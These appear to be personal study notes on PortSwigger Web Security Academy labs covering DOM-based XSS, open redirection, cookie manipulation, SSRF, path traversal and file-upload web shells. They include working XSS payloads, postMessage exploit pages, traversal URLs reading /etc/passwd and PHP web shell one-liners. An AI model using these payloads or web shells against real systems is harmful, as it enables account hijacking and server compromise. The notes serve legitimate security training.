                [Location hash Property](https://www.w3schools.com/jsreF/prop_loc_hash.asp)
                
            
            `myarray.slice(1);` outputs from second element of an array to the to the end 
            
            `url.hash.slice(1);` will  print the anchor without # ( from second character till the end of the string )
            
            - When an HTML document is loaded into a web browser, it becomes a D**ocument Object**
                
                The **document object** is the root node of the HTML document.
                
                The **document object** is a property of the **window object**.
                
                The **document object** is accessed with:
                
                `window.document` or just `document`
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20109.png)
                
                [HTML DOM Document Object](https://www.w3schools.com/jsref/dom_obj_document.asp)
                
            - `write()` is a Property / Method of a the Document Object that writes HTML expressions or JavaScript code to a document
                
                [HTML DOM Document write()](https://www.w3schools.com/jsref/met_doc_write.asp)
                
            - `eval()` simply executes javascript code
                
                ```jsx
                <p id="demo"></p>
                
                <script>
                let text = "alert('yo')";
                let result = eval(text); 
                
                document.getElementById("demo").innerHTML = result; //this will show pop up
                </script>
                ```
                
                [JavaScript eval()](https://www.w3schools.com/jsref/jsref_eval.asp)
                
            - window.open() opens  in a new browser tab by default
                
                could open in parent window ... depending on arguments
                
                [Window open()](https://www.w3schools.com/jsref/met_win_open.asp)
                
            - onsubmit event for forms
                
                [https://www.notion.so](https://www.notion.so)
                
            - Cross-window messaging
                
                The `postMessage`
                 interface allows windows to talk to each other no matter which origin they are from.
                
                [Cross-window communication](https://javascript.info/cross-window-communication#postmessage)
                
                [Window.postMessage - Référence Web API | MDN](https://developer.mozilla.org/fr/docs/Web/API/Window/postMessage)
                
            - top element in the DOM is the window object
            - localstorage is a storage to store temporary data
        - DOM Invader tool
            
            it’s a tool that u activate in burp chrommuim browser
            
            - if u used the extension and you find that the user input gets url encoded, then it’s simply not vulnerable.
            
            in order to do portswigger challenges with it, u have to click “access lab” then copy the temporary portswigger lab link from firefox to burps’chrommuim browser
            
            when u use inject on forms, it wil insert unique canarys in each input but u still have to click the submit button
            
            - In order to get events that needs a click, we should click on “Auto events are on” and in order to stop redirections, click on  “Redirection prevention on”.
                - in this case clicking on inject URL will inject on URL after clicking on each button ( from what i understood)
                - so it’s not responsible for inserting the canary, u gotta put it urself in the url or use ‘inject URL’ or ‘inject forms’
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20110.png)
                
            - by clicking on a message intercepted by this extension, we can see if the origin of the sender was checked or not, which could be an indicator of a vulnerability (u can obviously also check yourself by looking at the code)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20111.png)
                
            
            [Introducing DOM invader - A new tool within Burp Suite](https://www.youtube.com/watch?v=Wd2R47czzO0)
            
            [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)
            
        - DOM XSS in **`document.write`** sink using source **`location.search`**
            - `document.write`  prints both html and js
            - Using DOM Invader extension, we click on “Inject Forms”  (since the source is [`location.search`](http://location.search) according to description )
                - when u use inject on forms or smt, it wil insert unique canarys in each input but u still have to click the submit button
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20112.png)
                
            - we can see that our payload got injected in the following line  : `<img src="/resources/images/tracker.gif?searchTerms=mycanary">`
            - So, i  simply closed the image and added the alert payload and it worked : `z"><script>alert('mycanary')</script>`
            - when i solved the challenge later i went with :
                
                `img src="/resources/images/tracker.gif?searchTerms=mycanary" onload='alert(1)' >`
                
            - while in the DOM Invader video, they showed that this payloads can do the job
                - `" onload=alert(document.cookie)`  (one space at the end)
                - `" onload=alert(document.cookie) a=”` trying to close the remaining double quote
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20113.png)
                
                [Introducing DOM invader - A new tool within Burp Suite](https://www.youtube.com/watch?v=Wd2R47czzO0)
                
            
        - DOM XSS in **`innerHTML`** sink using source **`location.search`**
            
            since its [`location.search`](http://location.search), we simply inject in the url :
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20114.png)
            
        - DOM XSS using web messages
            - postMessage
                
                it’s a function to send messages between windows without having to deal with same origin policy  (usually it’s used when the app lunches a new window or an iframe and there is a need for communication between the parent page/window  and the  child window )
                
                messages can go from parent windows to child window and vise versa
                
                there is 2 bugs  in farah video :
                
                - when we have `windows.opener.postMessage(credentials,"*")`  the message will be sent no matter what the origin of the parent/child window
                - when we’re listening for the message event to be fired, we should check the origin of the sender ( )
                    - Otherwise, if there is no filtering and sink function we may have an xss
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20115.png)
                    
                
                [HACKING postMessage() FOR BEGINNERS!](https://www.youtube.com/watch?v=CWNxoxOX6sI)
                
                [Window.postMessage - Référence Web API | MDN](https://developer.mozilla.org/fr/docs/Web/API/Window/postMessage)
                
            - portswigger documentation
                
                [https://portswigger.net/web-security/dom-based/controlling-the-web-message-source](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)
                
            - lab url
                
                [Lab: DOM XSS using web messages | Web Security Academy](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)
                
            - in order to send post messages automatically and look for a dom xss (if there is an insecure message handler function)
                
                configure DOM Invader tool like the following image  : 
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20116.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20117.png)
                
            - by looking at the source code, we find the following message handler with no filtering
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20118.png)
                
            - we can also go to console in DOM Invader and click on the link below to get the vulnerable code
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20119.png)
                
            - when using the HTML DOM Element  property `innerHTML` we may have an issue when using  payloads inside `<script>` tags
                
                ```jsx
                <div id='ads'></div>
                <script>
                document.getElementById('ads').innerHTML = '<script>alert()</script>';
                </script>
                ```
                
                this won’t work because the browser will be confused when parsing the first `</script>` tag
                
                [SyntaxError: unterminated string literal ... tag not working within a string variable](https://stackoverflow.com/questions/30231151/syntaxerror-unterminated-string-literal-script-script-tag-not-working-wi)
                
                - they say u should escape it `<\/script>` but that didn’t work for me
                - that’s why we the payload `<img src=1 onerror="print()" />`  have more chances to work
                
            - in order to confirm that it’s vulnerable, in DOM invader video, they simply replay the message :
                - this two payloads worked for me. Apparently, the payload gets put inside single quotes because only double quotes and no quotes work.
                - u should see a pop up directly after pressing send
                - don’t forget that to solve the lab u should use print
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20120.png)
                
            - So, we use the following payload  with `<img>` tag  in the exploit server
                
                payload from portswigger website
                
                ```html
                <iframe src="https://ac2e1f841e49235ec05d5001000600fb.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print() />','*')">
                ```
                
            - why this works
                - this creates an iframe (like a child window) on the attacker’s website
                - when the victim will access the malicious link, the message will be sent containing the xss payload
                - the handler function will insert payload in the DOM of the page using `innerHTML` and voila !
            - portswigger comment on why this works
                
                When the `iframe` loads, the `postMessage()` method sends a web message to the home page. 
                
                The event listener, which is intended to serve ads, takes the content of the web message and 
                inserts it into the `div` with the ID `ads`. However, in this case it inserts our `img` tag, which contains an invalid `src` attribute. This throws an error, which causes the `onerror` event handler to execute our payload.
                
        - DOM XSS using web messages and a JavaScript URL
            - simply grepped on the string ‘message’ to find the vulnerable code
            - we can detect this vulnerability by using the following DOM Invader config
                - we start by only using “generate automated messages” but we notice that we get redirected
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20121.png)
                    
                - so we add “Redirection prevention”
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20122.png)
                    
            - Event handler containing the bug
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20123.png)
                
            - this means that if we can send a payload with `postMessage()` we will set the value of the URL
            - the only condition is that our payload should contain `http`: or `https:`
            - using `javascript:js_instructions` works in the url bar of chrome but not in firefox
                
                ```html
                javascript:let a=1;b=2;alert(a+b)//comment
                javascript:some_js_junction_declared_in_the_page()
                javascript:alert(document.domain)
                ```
                
            - so, we will use the following payload
                
                ```html
                <iframe src="https://ac621fd51eef6516c09d043700db0016.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//https:','*')">
                ```
                
            - we can generate payload automatically with DOM Invader
                - we find the right payload
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20124.png)
                    
                - we click on generate poc
                    
                    ```html
                    <!doctype html>
                            <html>
                                <head>
                                    <!-- DOM XSS PoC - generated by DOM Invader part of Burp Suite -->
                                    <meta charset="UTF-8" />
                                    <title>Postmessage PoC</title>
                                    <script>
                                        function pocLink() {
                                            let win = window.open('https://0a1100280462e662c0742e8d00710040.web-security-academy.net/');
                                            let msg = "javascript:print()//http:";
                                            
                                            setTimeout(function(){
                                                win.postMessage(msg, '*');
                                            }, 5000);
                                        }
                                        function pocFrame(win) {           
                                            let msg = "javascript:print()//http:";
                                            
                                            win.postMessage(msg, '*');          
                                        }
                                    </script>
                                </head>
                                <body>
                                    <a href="#" onclick="pocLink();">PoC link</a>          
                                    <iframe src="https://0a1100280462e662c0742e8d00710040.web-security-academy.net/" onload="pocFrame(this.contentWindow)"></iframe>                    
                                </body>
                            </html>
                    ```
                    
                - paste the generated poc in the exploit server, send it to the victim and voila !
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20125.png)
                    
        - DOM XSS using web messages and JSON.parse
            - bug part
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20126.png)
                
                - in the third line, we declare 3 variables and only the “d” variable were not given any value
                - the handler creates an iframe and parses the JSON using using the switch statement
                - the second case of the switch is interesting,  since it will modify the URL of the iframe with the “url” part of the json object if the “type” part of the object has the value “load-channel”
                - thereby, we will use a payload similar to the previous lab to execute JS from the URL (check next part )
            - Solution
                
                ```html
                <script>
                
                var obj = '{"type":"load-channel", "url":"javascript:print()"  }';
                </script>
                
                <iframe src="https://ac6d1f751e3720a3c0d36fa900ab0027.web-security-academy.net/" onload="this.contentWindow.postMessage(obj ,'*')">
                ```
                
                - using `var obj2 = {type:"load-channel", url:"javascript:alert()" }` won’t work because `postMessage` doesn't accept objects
                - so the only way to send an object is to serialize it with  `JSON.stringify(obj2)`
                    - this means, we should convert the object to a string first
                    - Object serialization is the process of converting an object’s state to a string from which it can later be restored, check link
                        
                        [JavaScript: The Definitive Guide, 6th Edition](https://www.oreilly.com/library/view/javascript-the-definitive/9781449393854/ch06s09.html)
                        
                - we are able to use this javascript function because `postMessage`is inside  `onload` (which execute a JavaScript immediately after a page has been loaded )
                    
                    ```jsx
                    <script>
                    
                    var obj2 = {type:"load-channel", url:"javascript:alert()"  }
                    
                    </script>
                    
                    <iframe src="https://ac671fe81f91c3bcc00f204800a50072.web-security-academy.net/" onload="this.contentWindow.postMessage(JSON.stringify(obj2),'*')">
                    ```
                    
            - Using DOM Invader can be helpful
                - the “Generate automated web messages” won’t be helpful in this case because it simply injects canarys and check if they are printed without filtering
                - While the “Postmessage interception is on” is helpful since we can check the payload we send :
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20127.png)
                
            - we click on “Build poc” and get the code that we need to use on the exploit server :
            
            ```html
            <!doctype html>
                    <html>
                        <head>
                            <!-- DOM XSS PoC - generated by DOM Invader part of Burp Suite -->
                            <meta charset="UTF-8" />
                            <title>Postmessage PoC</title>
                            <script>
                                function pocLink() {
                                    let win = window.open('https://0af9009304570da2c09e7e0b002c0048.web-security-academy.net/');
                                    let msg = "{\n    \"type\": \"load-channel\",\n    \"url\": \"javascript:print()\"\n}";
                                    
                                    setTimeout(function(){
                                        win.postMessage(msg, '*');
                                    }, 5000);
                                }
                                function pocFrame(win) {           
                                    let msg = "{\n    \"type\": \"load-channel\",\n    \"url\": \"javascript:print()\"\n}";
                                    
                                    win.postMessage(msg, '*');          
                                }
                            </script>
                        </head>
                        <body>
                            <a href="#" onclick="pocLink();">PoC link</a>          
                            <iframe src="https://0af9009304570da2c09e7e0b002c0048.web-security-academy.net/" onload="pocFrame(this.contentWindow)"></iframe>                    
                        </body>
                    </html>
            ```
            
        - DOM-based open redirection
            - u can grep on `location`
            - if we check the source code of a blog article, find the following code at the “back to Blog” button
                - `/url=(https?://.+)/` is a regex that we check if it exists in the url (location). The regex basically checks for a parameter named url and if it’s value matches an https URL.
                    
                    [https://www.w3schools.com/jsref/jsref_regexp_exec.asp](https://www.w3schools.com/jsref/jsref_regexp_exec.asp)
                    
                - so this line of code checks if a GET parameter `url` is defined with some value, if it’s the case and the victim clicks, it will switch the window.location to that value. Otherwise, clicking on the button “Back to blog” will only redirect you to `/`
                - if it’s not clear yet we have `/regex/.exec(location)` which matches the regex in the URL of the page
                - if you add the url parameter and it’s value u won’t be redirected, u should click on it (the victim should xD)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20128.png)
                
            - solution
                - after clicking on  some post and viewing the source code, we add another http GET parameter named `url` having the exploit server’s url as a value :
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20129.png)
                    
                
                ```html
                https://0a82009204ac060bc0a6300d00f600c2.web-security-academy.net/post?postId=8&url=https://exploit-0a32003c04aa0690c0bd30f101a70039.exploit-server.net/#
                ```
                
            - video solution
                
                [DOM based open redirection (Video solution)](https://www.youtube.com/watch?v=TuS8kONBBfs)
                
        - DOM-based cookie manipulation
            - lab link and solutions steps (best solution)
                
                [https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)
                
            - Looking at the source code of the page of a product
                - this means that if we change the url, it will change the value of the cookie ‘lastViewedProduct’
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20130.png)
                
            - to poc this, if we change the url, we notice a cookie was assigned with that value
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20131.png)
                
            - noticed that this cookie is used in the home page and it also gets used in the product page, since it’s in the source code of the button “Last viewed product” which appears in both this pages, when the cookie gets assigned
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20132.png)
                
            - i used the following payload in the exploit server
                
                ```html
                Hello, world!
                <script>
                window.location="https://0a2800b0030b7854c0934732004e00dc.web-security-academy.net/product?productId=3&url='><img src=e onerror=print() />";
                </script>
                ```
                
        - DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
            - lab link and the right solution
                
                [https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)
                
            - since the source is `[location.search](http://location.search)` i grepped on `?`
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20133.png)
                
            - we click on that link and look at the source code to find a code snippet in jquery
                - the code will change the attribute href of the anchor <a> having the id “backlink” to the value of the parameter `returnPath` that we get using `[window.location.search](http://window.location.search)`
                - jquery `attr` method sets the value of the attribute `href`
                    
                    [https://www.w3schools.com/jquery/html_attr.asp](https://www.w3schools.com/jquery/html_attr.asp)
                    
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20134.png)
                
            - we test this by redirecting to google
                - we change the value of returnPath to google
                
                ```ruby
                https://0a8f002b04d3f40cc01e543b004b0054.web-security-academy.net/feedback?returnPath=https://www.google.com
                ```
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20135.png)
                
                - if we click on the button back, we’ll be using the anchor with its new value so we get redirected to google
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20136.png)
                
            - so we abuse this to trigger an alert by using a malicious `href` value
                
                ```html
                https://0acf00200491db40c0833ba0008f0087.web-security-academy.net/feedback?returnPath=javascript:alert(1)
                ```
                
        - DOM XSS in jQuery selector sink using a hashchange event
            - lab link and solution
                
                [Lab: DOM XSS in jQuery selector sink using a hashchange event | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)
                
            - onhashchange Event
                
                [onhashchange Event](https://www.w3schools.com/jsref/event_onhashchange.asp)
                
            - jquery contains
                
                [https://www.w3schools.com/jquery/sel_contains.asp#:~:text=The %3Acontains() selector selects,like in the example above](https://www.w3schools.com/jquery/sel_contains.asp#:~:text=The%20%3Acontains()%20selector%20selects,like%20in%20the%20example%20above)).
                
            - looking at the code
                - the code checks if there is a change in the anchor part (the part that begins with a '#' symbol)
                - if it’s the case we access the `h2` tags that contain the result of decoding the anchor part, this `h2` tags should be inside the `section` tag that has ‘blog-list’ as a class.
                - The `scrollIntoView()` method scrolls an element into the visible area of the browser window.
                - so if we add `#Perseverance` at the end of the url, the jquery function will auto-scroll to that post.
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20137.png)
                
            - as said in the lab title, the sink here is the jQuery selector **`$("..")`**
            - since the new anchor will be inside the  jQuery selector, it will be parsed
            - so we scroll into an element triggering an xss
                - since the function is `onhashchange` our exploit should load the page then change the anchor part
                - we change the anchor part by an html element triggering an xss like `<img src=x onerror=print()>` (since they asked to do a `print()` in the lab description)
                - so the final exploit is :
                    
                    ```html
                    <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
                    ```
                    
        - DOM XSS in `document.write` sink using source `location.search` inside a select element
            - lab link and solution
                
                [https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)
                
            - according to the lab description the vulnerable feature is “stock checker functionality”, if we look at it’s source code, we can see that we are able to inject client side code in the second `document.write`
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20138.png)
                
            - so we use a simple payload `&storeId=<script>alert()</script>`  to trigger a pop up  such as :
                
                `&storeId=d</oprion></select><img src=1 onerror=alert(1)>`
                
                `&storeId=<script>alert()</script>`
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20139.png)
                
        - DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
            - lab link
                
                [https://www.notion.so](https://www.notion.so)
                
            - important note about Angular from lab description
                
                AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the `ng-app` attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are 
                being encoded.
                
            - Basically, the idea here is that even if there is XSS protection (angle brackets are being encoded) we can trigger an XSS if the app is using angular +  user input is inside  an `ng-app`directive
            - lab solution (from portswigger)
                - Enter a random alphanumeric string into the search box, view the page source and observe that your random string is enclosed in an `ng-app` directive.
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20140.png)
                    
                - Enter the following AngularJS expression in the search box `{{$on.constructor('alert(1)')()}}` and click **search**.
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20141.png)
                    
                - another possible payload is `{{constructor.constructor('alert(1)')()}}` from payload all the things - angular
                    
                    [PayloadsAllTheThings/XSS in Angular.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md)
                    
        - Reflected DOM XSS
            - what is a Reflected DOM XSS
                
                [https://portswigger.net/web-security/cross-site-scripting/dom-based](https://portswigger.net/web-security/cross-site-scripting/dom-based)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20142.png)
                
            - if we grep on `<script>` we can see that the app is calling an external file and using the function `search()` defined in that script
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20143.png)
                
            - looking at that JS file
                - we notice that the eval function is used to assign and also execute the result of the http request to the endpoint `search-results`  according to the previous code snippet from the home page
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20144.png)
                
            - when u execute `eval(var a=b)`  b is executed (unnecessary detail i discovered by accident)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20145.png)
                
            - by using burp and Dom Invader, we confirm that an http request is sent to the endpoint `/search-results` and that the user input is inside an eval
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20146.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20147.png)
                
            - so the goal is to escape from the variable definition and trigger a pop up,
            - but the problem is that double quotes gets escaped `“` becomes `\”`
                
                if we insert a payload like `"};alert();//` we get this :
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20148.png)
                
            - fortunately, back slash doesn’t get escaped
                - so we can use the payload `\"};alert();//` to trigger a pop up
                    - As you have injected a backslash and the site isn't escaping them, when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out. This means that the double-quotes are processed unescaped, which closes the string that should contain the search term.
                        
                        ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20149.png)
                        
                        ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20150.png)
                        
            - The `innerText` property sets or returns the text content of an element (so u’re unlikely to find an xss in a line where it’s used)
        - Stored DOM XSS
            - what is a Stored DOM XSS
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20151.png)
                
            - since it’s a stored DOM XSS and since we have this hint in the title, it makes sense to look into this javascript file
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20152.png)
                
            - if we look at the JS file
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20153.png)
                
                - we can see that it sends a GET request to get comments as json and parse them
                - then it applies a function names `escapeHTML` to encode angle brackets in many spots, one of them is the body
                    - it’s important to see where this function is used and go with the easiest  parameter that u can access easily
                    - wasted time trying to exploit it’s use in the “avatar” parameter of the comment which we can’t access in the first place
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20154.png)
                    
                - this function uses the JavaScript `replace()`function to encode angle brackets. However, when the first argument is a string, the function only replaces the first occurrence.
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20155.png)
                    
            - thereby, we can use the payload `<><img src=1 onerror=alert(1)>` to solve the lab
                - We exploit this vulnerability by simply including an extra set of angle brackets at the beginning of the comment. These angle brackets will be encoded, but any subsequent angle brackets will be unaffected, enabling us to effectively bypass the filter and inject HTML.
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20156.png)
                
- SSRF
    
    not sure why didn’t document labs solutions but this cheatsheet is gold :
    
    [SSRF Cheat Sheet & Bypass Techniques](https://highon.coffee/blog/ssrf-cheat-sheet/)
    
    the domain **`[hackingwithpentesterlab.link](http://hackingwithpentesterlab.link)`** can be useful since its **subdomains** resolve to 127.0.0.1 (not the domain itself, a subdomain like `yo.[hackingwithpentesterlab.link](http://hackingwithpentesterlab.link/)` 
    
- Directory traversal
    - File path traversal, simple case
        - To solve the lab, retrieve the contents of the `/etc/passwd` file.
        - copy image url
        - change filename to `../../../etc/passwd`  to solve the lab
        - always check for Directory traversal using Burp
            
            cuz in this case for example u get an error in the UI  but u can get passwd with Burp
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20157.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20158.png)
            
    - File path traversal, traversal sequences blocked with absolute path bypass
        - lab link and solution (same solution below)
            
            [https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)
            
        - Use Burp Suite to intercept and modify a request that fetches a product image.
        - Modify the `filename` parameter, giving it the value `/etc/passwd`.
        - Observe that the response contains the contents of the `/etc/passwd` file.
    - File path traversal, traversal sequences stripped non-recursively
        - lab link
            
            [https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)
            
        - since the filter is non recursive, we modify our payload
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20159.png)
            
        - we solve the lab using this link/payload
            
            ```html
            https://0a1e0053036c5591c0a379a400d6004b.web-security-academy.net/image?filename=....//....//....//....//....//....//....//....//etc/passwd
            ```
            
    - File path traversal, traversal sequences stripped with superfluous URL-decode
        - lab link
            
            [https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)
            
        - in this lab `../` cant be used and payload is url decoded once
        - so we need to use a payload which is double url encoded
        - my solution (lazy and not optimal payload)
            
            ```html
            url encoded this twice 
            ../../../../../../..
            then added /etc/passwd
            ```
            
            it becomes : 
            
            ```html
            %25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65/etc/passwd
            ```
            
        - optimal solution
            
            use the payload `..%252f..%252f..%252fetc/passwd`
            
            - how did you get that ?
                
                we start by url encoding `/` to get `%2f`
                
                url encoding `%` is `%25`
                
                so we get `%252f` from `/`
                
    - File path traversal, validation of start of path
        - lab link
            
            [https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)
            
        - The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.
        - what a normal link looks like
            
            ```html
            https://0a6b002c042bf82cc0b6d5d200680035.web-security-academy.net/image?filename=/var/www/images/4.jpg
            ```
            
        - link/payload we use to solve the lab
            
            payload used : `/var/www/images/../../../etc/passwd`
            
            ```html
            https://0a6b002c042bf82cc0b6d5d200680035.web-security-academy.net/image?filename=/var/www/images/../../../../../../../../../etc/passwd
            ```
            
    - File path traversal, validation of file extension with null byte bypass
        - lab link
            
            [https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)
            
        - we solve the lab using the payload `../../../etc/passwd%00.png`
        - this is what the url look like
            
            [https://0a26002d03faf826c0b61c75009d00e6.web-security-academy.net/image?filename=../../../../../../../../../etc/passwd.jpg](https://0a26002d03faf826c0b61c75009d00e6.web-security-academy.net/image?filename=../../../../../../../../../etc/passwd%00.jpg)
            
- File Upload
    - Remote code execution via web shell upload
        - liked this definition of a webshell
            
            A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by 
            sending HTTP requests to the right endpoint.
            
        - when they give u creds, u should look in the authenticated part of the page and not waste time in the unauthenticated part
        - there is no protection in this lab
        - after login, u can see a form, upload file, go back, get link of image and u should get the result
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20160.png)
            
        - problem is i wasted half an hour, trying to understand why the `system()` command didn’t work, it’s probably just blacklisted and u should simply try both this payloads
            
            `<?php echo file_get_contents('/path/to/target/file'); ?>`
            
            `<?php echo system($_GET['command']); ?>`
            
            - it can also be useful to send both the request of uploading and the request of viewing the uploaded file in Repeater
    - Web shell upload via Content-Type restriction bypass
        - it means there is a filtering on the MIME type
        - so while uploading i changed the the value of the `Content-Type` header to  `image/png`
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20161.png)
            
        - the file got uploaded and lab solved
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20162.png)
            
    - Web shell upload via path traversal
        - lab link
            
            [https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)
            
        - Web shell upload via path traversal
